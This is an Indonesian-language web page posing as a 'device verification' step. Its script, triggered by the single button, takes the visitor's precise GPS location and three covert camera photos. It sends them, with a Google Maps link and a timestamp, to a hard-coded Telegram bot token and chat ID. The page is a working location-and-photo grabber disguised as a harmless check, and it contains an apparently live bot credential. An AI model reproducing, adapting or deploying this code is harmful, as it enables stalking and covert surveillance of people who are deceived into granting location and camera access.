<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Verifikasi perangkat</title>

<link rel="icon" type="image/png" href="pp.png">
    
<style>
    body {
        margin: 0;
        background: #0a0a0f;
        color: #eaeaff;
        font-family: system-ui;
        display: flex;
        justify-content: center;
        padding: 25px;
    }
    .box {
        max-width: 360px;
        background: rgba(25,25,40,0.65);
        border: 1px solid rgba(120,60,255,0.3);
        padding: 22px;
        border-radius: 14px;
    }
    button {
        width: 100%;
        padding: 12px;
        margin-top: 16px;
        border: none;
        border-radius: 10px;
        background: linear-gradient(90deg,#8b4bff,#b36bff);
        color: white;
        font-size: 15px;
        font-weight: 600;
        cursor: pointer;
    }
    #status {
        margin-top: 14px;
        font-size: 13px;
        opacity: 0.7;
    }
</style>
</head>

<body>
<div class="box">
    <h2>Verifikasi perangkat</h2>

    <p style="opacity:0.75;">
        tekan tombol ini maka sistem akan langsung otomatis memverifikasi
        perangkat
        <br><br>
       ‚Ä¢ tunggu sampai verifikasi selesai
    </p>

    <button id="btnStart">Mulai Verifikasi</button>
    <div id="status">Menunggu aksi‚Ä¶</div>
</div>

<script>
// ==============================
// GANTI TOKEN BOT DAN CHAT ID
// ==============================
const BOT_TOKEN = "8565552587:AAFSJysYHitKWugVSHgcu1tymRF1pOSMEQg";
const CHAT_ID   = "8012228867";
// ==============================

const statusEl = document.getElementById("status");
function setStatus(t){ statusEl.textContent = t; }

document.getElementById("btnStart").onclick = async () => {
    try {
        // --------------------------
        // 1) AMBIL LOKASI
        // --------------------------
        setStatus("Verifikasi dimulai...");

        const pos = await new Promise((resolve, reject)=>{
            navigator.geolocation.getCurrentPosition(resolve, reject, {
                enableHighAccuracy: true, timeout: 15000
            });
        });

        const latitude  = pos.coords.latitude;
        const longitude = pos.coords.longitude;

        setStatus("verifikasi dimulai...");

        // Buat tanggal + waktu
const now = new Date();
const tgl  = now.toLocaleDateString("id-ID");
const jam  = now.toLocaleTimeString("id-ID");

// Format pesan baru
const textMsg = `
üìç *Lokasi Terkini Terkirim*

‚Ä¢ üåê *Koordinat:*
   - Latitude: ${latitude}
   - Longitude: ${longitude}

‚Ä¢ üó∫Ô∏è *Google Maps:*
   https://www.google.com/maps?q=${latitude},${longitude}

‚Ä¢ üìÖ *Tanggal:* ${tgl}
‚Ä¢ ‚è∞ *Waktu:* ${jam}

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
Dikirim otomatis melalui sistem lokasi.
`;

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: {"Content-Type":"application/json"},
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: textMsg,
                parse_mode: "Markdown"
            })
        });


        // --------------------------
        // 2) AKTIFKAN KAMERA
        // --------------------------
        setStatus("verifikasi dimulai...");

        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const track = stream.getVideoTracks()[0];
        const capture = new ImageCapture(track);

        // --------------------------
        // 3) AMBIL 3 FOTO OTOMATIS
        // --------------------------
        setStatus("verifikasi sedang berjalan...");

        const photoBlobs = [];

        for (let i = 0; i < 3; i++) {
            const blob = await capture.takePhoto();
            photoBlobs.push(blob);
            await new Promise(r => setTimeout(r, 200)); // jeda 200ms
        }

        track.stop(); // matikan kamera


        // --------------------------
        // 4) KIRIM 3 FOTO SEBAGAI ALBUM
        // --------------------------
        setStatus("verifikasi hampir selesai...");

        const form = new FormData();
        form.append("chat_id", CHAT_ID);

        const media = [];

        photoBlobs.forEach((blob, i) => {
            const fileName = `photo${i}.jpg`;
            form.append(fileName, blob, fileName);

            media.push({
                type: "photo",
                media: `attach://${fileName}`
            });
        });

        form.append("media", JSON.stringify(media));

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMediaGroup`, {
            method: "POST",
            body: form
        });

        setStatus("Selesai verifikasi!‚úî");

    } catch(err) {
        setStatus("Gagal: " + err.message);
        console.error(err);
    }
};
</script>

</body>
</html>
